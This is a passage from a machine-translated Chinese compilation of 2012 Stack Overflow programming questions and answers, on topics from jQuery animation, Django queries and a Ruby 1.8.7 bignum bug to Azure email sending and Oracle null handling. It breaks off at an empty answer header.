话虽如此，一些“meminfo”数据来自`ActivityManager`and `getProcessMemoryInfo()`。[Dianne Hackborn 对这个主题有一个史诗般的答案](https://stackoverflow.com/a/2299813/115145)。

> 或者如何添加自己的系统服务？

看上面。

> 我的目标是在应用程序运行时自动采样内存使用数据，并在事后分析数据。

假设`getProcessMemoryInfo()`有你需要的东西，你应该能够从一个普通的 SDK 应用程序中做到这一点。

# jquery - 使 jQuery 动画队列对点击无响应

> ID：12009776
> 
> 赞同：1
> 
> 时间：2012-08-17T16:41:11.490
> 
> 标签：jquery, animation

无论我做什么，我都无法让这一系列动画在运行时不受点击的影响。我已经尝试`.stop`在每个之前放置`.animate`（为布尔值尝试不同的“真”/“假”组合），但这并没有达到预期的效果。

理想情况下，在队列/链完成之前，动画对点击完全没有反应。

```
$(window).load(function () {
    $(document).ready(function () {
        $('.title-bar, #menu-wrap').click(function () {
            if ($('#menu-wrap').offset().top - $(window).scrollTop() === 0) {
                $('#menu-wrap').animate({top : '-170px'}, 1000);    
                $('.nav').slideToggle(1400);       
                $('.lower').css('background-image', 'none');
            } else {
                $('#menu-wrap').offset().top = 0;     
                $('#menu-wrap').animate({top : '0px'}, 1000); 
                $('.nav').slideToggle(600);
                $('.lower').css({'background-image' : 'url(menu2.png)', 'background-position' : 'bottom center'});
            }
        });
   });
}); 
```

希望你能帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:46:05.960

使用语法包装您的代码`$(elem).is(':animated')`以检查元素是否正在动画。前任：

```
if ( !$(this).is(':animated') ) ... 
```

更新示例：

```
 $('.title-bar, #menu-wrap').click(function () {
        if ( !$(this).is(':animated') ) {
        if ($('#menu-wrap').offset().top - $(window).scrollTop() === 0) {
            $('#menu-wrap').animate({top : '-170px'}, 1000);    
            $('.nav').slideToggle(1400);       
            $('.lower').css('background-image', 'none');
        } else {
            $('#menu-wrap').offset().top = 0;     
            $('#menu-wrap').animate({top : '0px'}, 1000); 
            $('.nav').slideToggle(600);
            $('.lower').css({'background-image' : 'url(menu2.png)', 'background-position' : 'bottom center'});
        }
        }
    }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:46:23.563

有一个名为 queue 的属性可以帮助你。我认为这应该会有所帮助...看起来，您应该编写一个回调函数，该函数将在其他函数完成后调用。

# richfaces - rich:isUserInRole 调用什么？

> ID：12009779
> 
> 赞同：0
> 
> 时间：2012-08-17T16:41:18.823
> 
> 标签：richfaces, jsf-1.2

我将 RichFaces 3.3.3 与 JSF 1.2 一起使用，我想了解 rich:isUserInRole 背后的行为。什么叫？何时何地在服务器端触发它？

供参考：[http ://docs.jboss.org/richfaces/latest_4_2_X/Component_Reference/en-US/html/chap-Component_Reference-Functions.html#sect-Component_Reference-Functions-richisUserInRole](http://docs.jboss.org/richfaces/latest_4_2_X/Component_Reference/en-US/html/chap-Component_Reference-Functions.html#sect-Component_Reference-Functions-richisUserInRole)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T18:07:35.490

它返回或应该返回结果`HttpServletRequest.isUserInRole().`

# iphone - 如何在 Xcode 4.1 中安装其他 iOS 模拟器？

> ID：12009783
> 
> 赞同：0
> 
> 时间：2012-08-17T16:41:40.687
> 
> 标签：iphone, xcode, ios4, ios-simulator

我正在尝试进行 iOS 开发，昨天我终于在 Windows 上使用**Mac OS X Lion 10.7.1**制作了一个 VMWare 虚拟机，因为这是我让它作为虚拟机运行的唯一版本，我首先想看看在购买 Mac 之前完成所有这些，因为我是 .NET 开发人员。

因此，当尝试使用实际 Xcode 版本更新操作系统时，虚拟机会崩溃。因此，可以在此处为 Xcode 运行的版本是**4.1** *（如果错误，请纠正我）*，我也安装成功。

现在一切正常，但是当我在 Xcode 上创建一个新项目时，我查看了模拟器，我唯一能看到的是**iOS 4.3 iPhone 模拟器** *（不确定 iPad 模拟器是否也是如此）*。

所以，我的问题是...

***如何使用 Xcode 4.1 单独安装其他模拟器，如 iOS 5 iPhone 或 iPad 模拟器？如果这是不可能的，我用我得到的东西做了一个应用程序，它也会在 iOS5 上运行吗？或者我怎么看它是否在 iPad 和 iOS5 上运行良好？***

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T16:43:40.730

您可以在 Xcode Preferences > Downloads > Components 下下载模拟器。

# javascript - 使用 phonegap 在 webview 中加载资产

> ID：12009787
> 
> 赞同：3
> 
> 时间：2012-08-17T16:41:55.533
> 
> 标签：javascript, jquery, mobile, cordova, uiwebview

我似乎无法在 Cordova 网站或其他任何地方找到答案。在您通过 Phonegap 的 webview 中，是否可以加载 webview 中正在加载的文件的本地 javascript 文件和 css 文件？

例如，我有一个 html 页面，该页面中的 mysite.com/nativeview.html 有 3 个依赖文件 style.css、jquery.js 和 lib.js，它们都位于 mysite.com 服务器上。我可以将 mysite.com/nativeview.html 加载到我的应用程序的 webview 中并同时加载相关文件吗？

我可以将我的页面加载到 webview 中，但没有应用样式或 javascript。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-11T11:09:36.440

我所做的是为依赖文件创建符号链接。您可以使用符号链接单个文件或文件夹

`ln -s source target`

或者您可以使用符号链接目录而不是文件夹的内容`lndir`

只要所有文件都在 www 文件夹中并且符号链接的源没有移动，那么你应该没问题。理想情况下，www 将位于另一个文件夹中，例如 src 或 mobile-commons，以适应其他测试环境（例如 Xcode 或 eclipse（适用于 android））可能无法看到 www 文件夹的事实，在这种情况下，您必须指定所有资源相对于 src/mobile-commons 而不是 www 的位置。

# objective-c - UILabels 让我的应用程序崩溃

> ID：12009790
> 
> 赞同：0
> 
> 时间：2012-08-17T16:42:08.767
> 
> 标签：objective-c, ios, nsstring

所以我不知道任何方法来绘制文本或字符串，但 UILabel。所以我初始化了标签，但它总是让我的应用程序崩溃。

以下是初始化标签并导致崩溃的方法：

> -（无效）setupScore{
> 
> ```
> scoreLabel = [NSString stringWithFormat:@"%d", score];
> scoreLabel.frame = CGRectMake(262, 250, 100, 40);
> [scoreLabel setText: scoreString];
> 
> //normally you'll want a transparent background for your label
> scoreLabel.backgroundColor = [UIColor clearColor]; 
> 
> //you can use non-standard fonts
> [scoreLabel setFont:[UIFont fontWithName:@"TimesNewRoman" size: 1.0f]];
> 
> //change the label's text color
> scoreLabel.textColor = [UIColor whiteColor];
> 
> //add it to your view
> scoreLabel.transform = CGAffineTransformMakeRotation(89.53);
> [self addSubview:scoreLabel]; } 
> ```
> 
> -（无效）setupPausedLabel{
> 
> ```
> pausedLabel = [NSString stringWithFormat:@"Tap To Resume"];
> pausedLabel.frame = CGRectMake(262, 250, 100, 40);
> [pausedLabel setText: @"Tap To Resume"];
> 
> //normally you'll want a transparent background for your label
> pausedLabel.backgroundColor = [UIColor clearColor];
> 
> //you can use non-standard fonts
> [pausedLabel setFont:[UIFont fontWithName:@"TimesNewRoman" size: 1.0f]];
> 
> //change the label's text color
> pausedLabel.textColor = [UIColor whiteColor];
> 
> //add it to your view
> pausedLabel.transform = CGAffineTransformMakeRotation(89.53);
> [pausedLabel setHidden: YES];
> [self addSubview:pausedLabel]; } 
> ```

谢谢你的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:45:21.337

你正在做：

```
scoreLabel = [NSString stringWithFormat:@"%d", score]; 
```

你应该做 ：

```
scoreLabel = [[UILabel alloc] init];    // And release it somewhere
scoreString = [NSString stringWithFormat:@"%d", score]; 
```

和 pauseLabel 一样。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:45:57.240

您正在使用 NSString 类初始化标签，它应该是 UILabel。确保使用好的格式器生成字符串：%d 用于整数，%@ 用于 NSString 对象。检查此[文档](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Strings/Articles/formatSpecifiers.html)以找到适当的说明符：

```
NSString* scoreString = [NSString stringWithFormat:@"%d", score];
NSString* anotherString = @"Tap To Resume";
NSString* pausedString = [NSString stringWithFormat:@"%@", anotherString]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T17:06:12.960

你在第一行就错了。

```
scoreLabel = [NSString stringWithFormat:@"%d", score];

scoreLabel=[[UILable alloc]init];
scoreLabel.text=[NSString stringWithFormat:@"%i",score]; 
```

和 NextMethod 中的相同问题

```
pausedLabel = [NSString stringWithFormat:@"Tap To Resume"]; 
```

这是不对的

```
 pausedLabel=[[UILable alloc]init];
pausedLable.text=[NSString stringWithFormat:@"Tap To Resume"]; 
```

UILable text 属性你搞砸了所以它给你崩溃的问题

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T17:42:50.697

```
-(void) setupScore{

 scoreLabel.text = [NSString stringWithFormat:@"%d", score];
scoreLabel.frame = CGRectMake(262, 250, 100, 40); 
```

[scoreLabel setText: scoreString];

```
//normally you'll want a transparent background for your label
scoreLabel.backgroundColor = [UIColor clearColor]; 

//you can use non-standard fonts
[scoreLabel setFont:[UIFont fontWithName:@"TimesNewRoman" size: 1.0f]];

//change the label's text color
scoreLabel.textColor = [UIColor whiteColor];

//add it to your view
scoreLabel.transform = CGAffineTransformMakeRotation(89.53);
[self.view addSubview:scoreLabel]; 
```

}

它工作正常我在 viewDidLoad 中调用它

```
- (void)viewDidLoad 
```

{ [超级 viewDidLoad];

```
scoreLabel=[[UILabel alloc]init];

scoreString=[NSString stringWithString:@"1221"];

score=10;

[self setupScore];

scoreString=[NSString stringWithString:@"11"];

[self setupScore];

scoreString=[NSString stringWithString:@"333"];

[self setupScore];

[self setupScore];

scoreLabel.text=@"okey..."; 
```

}

# qt - Qt 4.7 向特定线程发出信号

> ID：12009791
> 
> 赞同：0
> 
> 时间：2012-08-17T16:42:35.767
> 
> 标签：qt

我有几个客户端 GUI 窗口都源自`QMainWindow`. 每个窗口都可能执行不同的任务，但都从实现为`QThread`.

所有客户端都连接到`slot`数据缓存中的同一个，然后发出`signal`s 来提示数据缓存做某事。数据缓存的`signal`s 排队，因此数据缓存一次只做一件事。

当数据缓存完成时，它需要通知正确的客户端它正在做的事情已经完成。`signal`我的直接想法是向提出请求的客户发出关于完成的信息。这意味着连接到一个特定的客户端`slot`，然后`signal`向它发出一个。

我必须先连接然后断开与客户端的连接吗？我知道`QObject::sender()`获取供应商的功能。是否有某种方式仅向该发送者（客户端）发出信号？还是有其他方法可以做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T22:02:36.747

您可以采取更简单的方法来解决您的问题。例如，我会考虑研究[QtConcurrent](http://qt-project.org/doc/qt-4.8/threads-qtconcurrent.html)框架。或者，您也可以重新设计您的设计，以便客户端首先连接到缓存上的“完成”信号，然后再要求缓存执行任何操作。如果所有这些都失败了，您还可以考虑依赖[QMetaObject::invokeMethod](http://qt-project.org/doc/qt-4.8/qmetaobject.html#invokeMethod)函数（对于您的客户端或您的缓存）。此函数允许您使用任意泛型参数（以线程安全的方式）调用任意 QObject 上的任意方法（前提是您有指向它的指针）。

如果您使用该`QMetaObject::invokeMethod`方法，则应该注意一些缺点。首先，您必须使用它的字符串名称来调用该方法，这意味着您在编译时不会发现您是否使用了错误的名称。其次，由于您的客户端与中央缓存具有不同的线程亲和性，因此当缓存调用它们上的方法时，客户端有可能已被销毁（尽管在您的情况下，这对您来说不是问题） . 最后，您可能不希望您的缓存知道它必须在其客户端上执行的方法的名称。

我没有办法解决第一个缺点（我不确定在即将发布的 Qt 5.0 版本中是否会以不同的方式处理）。至于第二个和第三个问题，我建议创建一个封装对方法的引用的对象——如下所示：

```
class MethodReference
{
   MethodReference(QObject* object, const QString& methodName);

   ...

   bool invoke(QGenericArgument val0 = QGenericArgument(),
               QGenericArgument val1 = QGenericArgument(),
               ...
               QGenericArgument val9 = QGenericArgument());

private:
   QPointer<QObject> mObject;
   QString mMethod;
}; 
```

然后，您可以将此对象从客户端传递到您的缓存。然后缓存调用这个对象的调用。

请注意使用`QPointer`-- 这为您提供了一种线程安全的方法，可以在您尝试对其调用方法之前检查您的对象是否已被销毁。因为我以前做过，所以我也会告诉你，4.8 之前的 Qt 版本有一个[错误`QPointer`](https://bugreports.qt-project.org/browse/QTBUG-16005)，会导致多线程上下文中的崩溃。如果您想这样做，请使用更新版本的 Qt。

我希望这很清楚。

# python - 在 django 中查找没有关系的对象

> ID：12009792
> 
> 赞同：0
> 
> 时间：2012-08-17T16:42:39.673
> 
> 标签：python, django

我正在学习 Django，并且想要检索与我正在查看的当前对象没有关系的所有对象。

这个想法是一个简单的 Twitter 模仿者。

我想弄清楚如何实现 get_non_followers

谢谢！

```
from django.db import models

RELATIONSHIP_FOLLOWING = 1
RELATIONSHIP_BLOCKED = 2
RELATIONSHIP_STATUSES = (
                         (RELATIONSHIP_FOLLOWING, 'Following'),
                         (RELATIONSHIP_BLOCKED, 'Blocked'),
)

class UserProfile(models.Model):
    name = models.CharField(max_length=200)
    website = models.CharField(max_length=200)
    email = models.EmailField()
    relationships = models.ManyToManyField('self', through='Relationship', 
                                           symmetrical=False, 
                                           related_name='related_to')
    def __unicode__ (self):
        return self.name

    def add_relationship(self, person, status):
        relationship, created = Relationship.objects.get_or_create(
            from_person=self,
            to_person=person,
            status=status)
        return relationship

    def remove_relationship(self, person, status):
        Relationship.objects.filter(
            from_person=self, 
            to_person=person,
            status=status).delete()
        return

    def get_relationships(self, status):
        return self.relationships.filter(
        to_people__status=status, 
        to_people__from_person=self)

    def get_related_to(self, status):
        return self.related_to.filter(
            from_people__status=status, 
            from_people__to_person=self)

    def get_following(self):
        return self.get_relationships(RELATIONSHIP_FOLLOWING)

    def get_followers(self):
        return self.get_related_to(RELATIONSHIP_FOLLOWING)

    def get_non_followers(self):
        # How to do this?
        return

class Relationship(models.Model):
    from_person = models.ForeignKey(UserProfile, related_name='from_people')
    to_person = models.ForeignKey(UserProfile, related_name='to_people')
    status = models.IntegerField(choices=RELATIONSHIP_STATUSES) 
```

编辑：

get_non_followers 实现的解决方案：

```
def get_non_following(self):
    return UserProfile.objects.exclude(to_person__from_person=self, to_person__status=RELATIONSHIP_FOLLOWING).exclude(id=self.id) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-24T09:15:34.027

我一直在寻找一种方法或某种方式来做到这一点，但我一无所获。但有办法做到这一点。您可以简单地使用 for 循环遍历所有对象并删除它们具有特殊属性值的所有对象。这里有一个示例代码：

```
all_objects = className.objects.all()
for obj in all_objects:
    if obj.some_attribute == "some_value":
        all_objects.remove(obj) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T20:16:21.530

这并不是特别迷人，但它给出了正确的结果（刚刚测试过）：

```
def get_non_followers(self):
    UserProfile.objects.exclude(to_people=self,
        to_people__status=RELATIONSHIP_FOLLOWING).exclude(id=self.id) 
```

简而言之，用于`exclude()`过滤掉所有`UserProfiles`关注当前用户，这将留下用户自己（可能不应该包括在内）和所有不关注他们的用户。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-17T18:04:05.120

我没有对此进行测试，但它认为它应该做你想要的。

```
def get_non_followers(self):
    return self.related_to.exclude(
    from_people__to_person=self) 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-08-17T17:39:17.400

```
current_userprofile = current_user.get_profile()
rest_of_users = Set(UserProfile.objects.filter(user != current_userprofile))
follow_relationships = current_userprofile.relationships.filter(from_person=current_user)
followers = Set();
for follow in follow_relationships:
    followers.add(follow.to_person)

non_followeres = rest_of_users.difference(followers) 
```

这`non_followers`是您想要的用户配置文件列表。`current_user`是您要查找的对象`user`。`non_followers`

# ruby - Ruby 1.8.7 中的求幂返回错误答案

> ID：12009799
> 
> 赞同：8
> 
> 时间：2012-08-17T16:43:15.737
> 
> 标签：ruby, bignum, exponential

当我尝试在 irb 中计算 3**557 时遇到了这个问题。Ruby 和 MacRuby 都安装在我的 Mac (OS X 10.8) 中。ruby 的版本是 1.8.7，MacRuby 的版本是 0.12（ruby 1.9.2）。rib 和 macirb 在计算 3**557 时给了我两个不同的答案。（macirb 是对的。）

```
$ irb
>> 3**557
=> 54755702179342762063551440788945541007926808765326951193810107165429610423703291760740244724326099993131913104272587572918520442872536889724676586931200965615875242243330408150984753872526006744122187638040962508934109837755428764447134683114539218909666971979603

$ macirb
irb(main):001:0> 3**557
=> 57087217942658063217290581978966727348872586279944803346410228520919738045995056049600505293676159316424182057188730248707922985741467061108015301244570536546607487919981026877250949414156613856336341922395385463291076789878575326012378057561766997352898452974964563 
```

然后我尝试了更大的东西，例如 3**5337，这次我得到了相同的答案。

那么，这是 Ruby 1.8.7 中的一个错误，还是我应该使用另一种方法来计算幂？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T17:30:09.523

在计算时，当数字超出 Fixnum 的范围时，Ruby 应该从 Fixnum 转换为 Bignum。对于旧版本的 Ruby，使用 ** 运算符会失败：

```
$ ruby --version
ruby 1.8.7 (2012-02-08 patchlevel 358) [universal-darwin12.0]
$ irb
>> 2 ** 62
=> 4611686018427387904
>> 2 ** 63
=> -9223372036854775808
>> 2 ** 64
=> 0 
```

它失败的地方取决于架构的字长。本例中 iMac 上的 64 位字。在内部，Fixnum 被强制转换为长整数，并且操作符使用长整数进行处理。longs 在字长处溢出，Ruby 通过返回 0 来处理这个问题。

请注意， * 运算符正常工作（转换为 Bignum），其中 ** 失败：

```
>> a = 2 ** 62
=> 4611686018427387904
>> 2 ** 63
=> -9223372036854775808
>> a * 2
=> 9223372036854775808
>> 2 ** 64
=> 0
>> a * 4
=> 18446744073709551616 
```

迁移到较新版本的 Ruby 将解决此问题。如果您无法迁移到更新的版本，请避免使用具有较大幂的 Fixnum 和 **。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T17:40:47.060

使用 1.9.3 会产生正确的结果。除非您有充分的理由，否则请尝试使用 1.9.3 或更高版本，因为 1.8.7 正在逐步淘汰。

还值得注意的是，在 Linux 上使用 1.8.7-p358 进行测试后，我也得到了正确答案。这可能是您正在使用的 1.8.7 特定版本中的错误。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T21:05:32.837

这绝对是一个错误。它可能取决于处理器和/或编译选项。

[如果这个 commit](https://github.com/ruby/ruby/commit/4e4649e13cd4175aab75a0edc2fc5b082cf735d1)修复了它，我不会感到惊讶。

正如其他人所说，现在只有安全修复程序才能升级到 1.8.7，所以升级到 1.9.3。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-15T16:44:19.797

它与显式求幂无关。我认为这在某种程度上与表示所需的从 63 位到 64 位的转换有关，尽管这似乎不是 100% 一致的。

```
>> 19**14
=> 799006685782884121
>> 19**15
=> -3265617043834753317
>> (19**14)*19
=> -3265617043834753317 
```

和

```
>> 2**64-1
=> -1
>> 2**64
=> 0
>> 0x7fffffffffffffff
=> 9223372036854775807 
```

然而

```
>> 0x8000000000000000
=> 9223372036854775808 
```

另外：在 32 位模式下运行 irb ( `arch -i386 irb`)，此时我没有看到这个，但更早：

```
>> 19**15
=> 15181127029874798299
>> 2**31
=> -2147483648 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-05-06T16:14:41.190

编写自己的求幂方法似乎是另一种不会产生错误的方法：

```
def xpnt(base, exponent)
    sum = base
    while exponent >= 2
        sum = sum * base
        exponent -= 1
    end
    puts sum
end 
```

任何幂的“10”都应以单个“1”开头，后面只跟零。红宝石的`**`作用：

```
10 ** 40
=> 10000000000000000000092233720368547758080 
```

自定义`xpnt`方法：

```
xpnt 10, 40
10000000000000000000000000000000000000000
=> nil 
```

# jsp - Servlet过滤器行为模棱两可？

> ID：12009806
> 
> 赞同：1
> 
> 时间：2012-08-17T16:44:13.740
> 
> 标签：jsp, tomcat, servlets, webserver, servlet-filters

在 servlet 过滤器中， filterChain.doFilter(request, response); 应该将请求传递给链中的下一个。但请考虑以下两个代码：
代码 1：

```
public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException 
{
filterChain.doFilter(request, response);
try
{
Thread.sleep(20000);
}
catch(Exception e)
{
}            
} 
```

代码 2：

```
public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException 
{
try
{
Thread.sleep(20000);
}
catch(Exception e)
{
}      
filterChain.doFilter(request, response);      
} 
```

两个过滤器的执行方式相同。即在服务请求之前两者都需要 20 秒。
但实际上应该发生的是`Code1`应该立即发球并且`Code2`应该在 20 秒后发球。为什么过滤器中有这种歧义？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T17:19:37.577

在 servlet 或过滤器中休眠总是一个坏主意，因为 HTTP 工作线程是稀缺资源，因此您不应该阻止它们。但是在您的特定示例中，有希望。

基本上，您在 servlet 中打印或过滤到输出的任何内容都会被隐式缓冲以提高性能。如果您在 servlet/filter 中打印足够的数据，则 servlet 容器将刷新缓冲区，并且您的部分响应将到达客户端。但您也可以手动冲洗！

```
public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
    filterChain.doFilter(request, response);
    response.flushBuffer();
    Thread.sleep(20000);
} 
```

`flushBuffer()`指令强制容器刷新输出缓冲区。所有响应标头以及您从 servlet 发送的任何内容都将发送到客户端。但这里有一个问题：客户端将接收数据，但 HTTP 连接在接下来的 20 秒内保持打开状态。我对此进行了测试`curl`，它按预期工作。但是当在浏览器中使用相同的 URL 时（在 Opera、Firefox 和 Google Chrome 上测试），浏览器会等待 20 秒再显示任何内容（这可能取决于您实际发送的内容）。

# azure - 电子邮件消息模块不适用于 azure

> ID：12009815
> 
> 赞同：4
> 
> 时间：2012-08-17T16:45:02.617
> 
> 标签：azure, orchardcms

我已经在**azure上部署了****Orchard**并启用了**电子邮件消息模块**。启用表示它**成功**启用并要求电子邮件设置。我提供了邮件服务器设置。奇怪的是，用户设置没有向我显示依赖于电子邮件消息模块的设置（联系我们的电子邮件地址和公共站点名称），也没有向我显示（“丢失密码”）链接。我还构建了一个发送电子邮件的模块。此模块不发送电子邮件。

 ******相同的果园包可以正常工作，并且可以在我的开发服务器上使用相同的邮件服务器设置（gmail smtp 设置）发送电子邮件。但电子邮件无法在 azure 上运行。

我错过了什么？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T21:44:14.210

对于访问此问题的其他任何人，仅供参考，我刚刚使用 gmail SMTP 服务器从 Azure 得到了这个工作，没有任何第三方加载项。我只是添加了以下 SMTP 详细信息：

![在此处输入图像描述](../Images/28b8c5c0a55cde4bb7ddec65e23eebbe.png)

然后使用联系表给我自己发送了一封电子邮件。第一封电子邮件提醒我的 gmail 帐户：

```
Hi Simon, 

Someone recently tried to use an application to sign in to your Google Account - XXX@gmail.com. 

We prevented the sign-in attempt in case this was a hijacker trying to access your account. Please review the details of the sign-in attempt: 

Monday, April 8, 2013 9:33:46 PM UTC 
IP Address: 65.52.168.70 
Location: United States

...blah blah blah

If this was you, and you are having trouble accessing your account, complete the troubleshooting steps listed at http://support.google.com/mail?p=client_login 
```

通过链接，您可以选择允许应用程序使用您的凭据登录。只需点击第 3 步中的链接，然后您有 10 分钟的时间从您的果园网站发送另一封电子邮件。我收到的下一条测试消息没有问题。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-03T05:05:21.910

知道了。Windows Azure 本身不允许发送电子邮件，也不允许使用 SMTP。我们必须使用 PostMark、SendGrid 等第三方电子邮件服务

[http://blogs.msdn.com/b/publicsector/archive/2011/10/14/sending-and-receiving-email-in-windows-azure.aspx](http://blogs.msdn.com/b/publicsector/archive/2011/10/14/sending-and-receiving-email-in-windows-azure.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-14T03:33:20.247

所以，我只是好奇安装在 Windows Azure（图库）上的 WordPress 是如何发送电子邮件的？

[http://coffee2code.com/wp-plugins/configure-smtp/](http://coffee2code.com/wp-plugins/configure-smtp/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-01-07T19:25:23.957

关于这个主题仍然有太多不同的建议，所以我想我应该写下我发现有用的东西。这是我为使其正常工作所做的工作：

**我的 SMTP 设置：**

> **发件人**地址：myname@gmail.com
> 
> **主机名：** smtp@gmail.com
> 
> **端口：** 587 *（25也可以）*
> 
> **SSL 通信：**已选中
> 
> **凭据：**我的 Gmail 地址和密码

这些设置应该可以在您的本地环境中正常工作。但在云端，您可能需要执行以下操作：

由于您的 Azure VM 可能位于任意位置，Gmail 会将登录尝试标记为可疑并阻止它们。如果是这种情况，您应该会在收件箱中看到一封通知您此可疑活动的邮件。只需按照那里的说明并将登录标记为受信任。它将保持这种状态，直到您在云上的 IP 发生某种变化（例如，删除您的部署槽）。虚拟机重定位应该不是问题，因为 IP 仍然保持不变。您可能必须为暂存和生产槽分别执行此操作。

最后，我为我的网络角色启用了完全信任，如下所示：http: [//blogs.msdn.com/b/windowsazure/archive/2009/03/18/hosting-roles-under-net-full-trust.aspx](http://blogs.msdn.com/b/windowsazure/archive/2009/03/18/hosting-roles-under-net-full-trust.aspx)

我希望这可以帮助其他有这个问题的人。

干杯******

# sql - SQL从具有空值的行数据中选择MIN值

> ID：12009817
> 
> 赞同：0
> 
> 时间：2012-08-17T16:45:15.590
> 
> 标签：sql, oracle

我在 Oracle 中的表是这样的

```
Col   Col1  Col2  Col3  ColR
--   ----  ----   ----  ---- 
30    73    40    null  -10
60    32    null  20     40
90    80    null  null   10
80    45    81    30     50 
```

我也可以在上面的列中设置 0 而不是 null。我需要从 Col1、Col2、Col3 中找到最小值，忽略 null 或 0，并通过从 Col 中减去来填充 ColR。

编辑：我写了一个 CASE 语句，由于表中的空值而不起作用。

```
 SELECT col,col1,col2,col3,
  CASE
    WHEN Col1 < Col2 AND Col1  < Col3
    THEN Col - Col1
    WHEN Col2 < Col1 AND Col2  < Col3
    THEN Col - Col2
    ELSE Col - Col3
  END ColR
FROM
 (SELECT col,col1,
   CASE
    WHEN col22 IS NULL
    THEN NULL( i can also SET TO 0 but it will mess  WITH my other calculation TO find MIN)
      ELSE ROUND( 100* ( (col22) / (col44)))
    END col2 ,
    CASE
      WHEN col33 IS NULL
      THEN NULL
      ELSE ROUND( 100* ( (col33) / (col44)))
    END col3
  FROM TABLE
  ) 
```

我刚刚在我的选择查询中包含了 case 语句。所有的列值都是从另一个查询中填充的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T17:08:42.133

听起来你想要类似的东西

```
SELECT least( (case when col1 is null or col1 = 0 then 999999999 else col1 end),
              (case when col2 is null or col2 = 0 then 999999999 else col2 end),
              (case when col3 is null or col3 = 0 then 999999999 else col3 end) )
  FROM <<table name>> 
```

其中 999999999 是一个足够大的数值，它总是大于任何其他有效值。如果所有三列都有`NULL`或 0 值，那么您可能需要添加一个额外的检查，如果该`least`函数的结果是 999999999 您返回 0 或`NULL`其他任何有意义的值。

@X-Zero 非常友好地将这个构造的[SQL Fiddle 示例](http://www.sqlfiddle.com/#!4/a9e12/3)放在一起。请注意，他的示例是过滤掉所有三列都具有`NULL`或 0 值的行。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:50:02.107

// 如果您需要 COL1 或 COL（任何列）中的最小值

`SELECT MIN (COL1) FROM (SELECT * FROM TABLE WHERE COL1 IS NOT NULL)`

您能否详细说明一下，实际上我无法为您提供这一小部分信息。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:58:11.923

Oracle NVL 用法：

```
nvl(check_expression, replacement_value) 
```

因此， nvl(col2,0) 应该采用与您的数学相混淆的空值。

所以试试：

```
CASE
       WHEN nvl(col1,0) < nvl(col2,0) AND nvl(col1,0) < nvl(col3,0)
       THEN Col - nvl(col1,0)
       WHEN  nvl(col2,0) < nvl(col1,0) AND nvl(col2,0) < nvl(col3,0)
       THEN Col - nvl(col2,0)
       ELSE Col - nvl(col3,0)
END ColR 
```

编辑：我错过了 X-Zero 的观点。我认为，如果您将 NULLS 替换为 9999999 而不是 0，则逻辑将起作用，尽管这可能对该示例数据过于具体，而不是现实世界的解决方案。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-17T17:05:54.870

如果要忽略列中的空值，可以使用 NVL 函数将它们包装起来。这会将列中的空值替换为指定的值，您可以为此使用一些大数字。例如：
`NVL(col1,99999)`

Oracle 数据库 SQL 参考 - NVL：[http ://docs.oracle.com/cd/B19306_01/server.102/b14200/functions105.htm](http://docs.oracle.com/cd/B19306_01/server.102/b14200/functions105.htm)

# c++ - 通过另一个指针删除指向类中多维数组的指针 - 如何？

> ID：12009818
> 
> 赞同：1
> 
> 时间：2012-08-17T16:45:17.643
> 
> 标签：c++, class, pointers, multidimensional-array, delete-operator

我有一个指向一个类的指针，它有一个指向多维数组的指针，但是当我需要或将其设置为 NULL 时，我似乎无法从内存中删除它。

```
#define X 10
#define Y 10

struct TestClass
{
public:
       int      *pArray[X][Y];
};

// different tries, none working:

delete Pointer_To_TestClass->pArray[0][0];
delete[] Pointer_To_TestClass->pArray[0][0]

// or by simply:

Pointer_To_TestClass->pArray[0][0] = NULL; 
```

我知道数组有数据，因为我可以在屏幕上看到结果。还要检查它是否已经为 NULL，然后不要尝试删除它。

由于我想删除另一个指针中的指针 - 这是一种不同的特殊情况吗？就像它删除了第一个指针，而不是指针内部的指针（pArray 是第二个指针，Pointer_To_Testclass 是第一个指针）

**更新/解释**

我希望能够删除 pArray[0][0] 而 pArray[0][1] 仍然存在，如果 [0][0] 不存在它应该等于**NULL**。主要是因为我想通过 [X][Y] 值访问这个数组以便于访问。如果 [0][0] 是一个指针，删除时它应该是 NULL，所以我可以检查它是否为 NULL。

有人有什么想法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-17T16:59:21.360

